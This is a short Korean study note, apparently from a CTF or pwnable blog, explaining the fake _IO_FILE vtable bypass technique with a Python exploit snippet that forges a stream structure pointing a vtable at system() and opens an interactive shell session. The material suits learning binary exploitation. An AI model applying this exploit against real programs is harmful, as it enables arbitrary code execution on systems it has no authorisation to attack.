---
layout: post
type: note
title: vtable bypass
alias: Pwnable
---

fake _IO_FILE Structure를 만들어 vtable의 조작된 함수 포인터가 실행되게 만들면 된다.

```python
stream = p64(0)*17
stream += p64(NULLPOINTER) # _IO_lock_t
stream += p64(0)*9
stream += p64(vtable)
stream += p64(system)*20

p.sendline(stream)
p.interactive()
```



### Reference

https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/fake-vtable-exploit

https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique
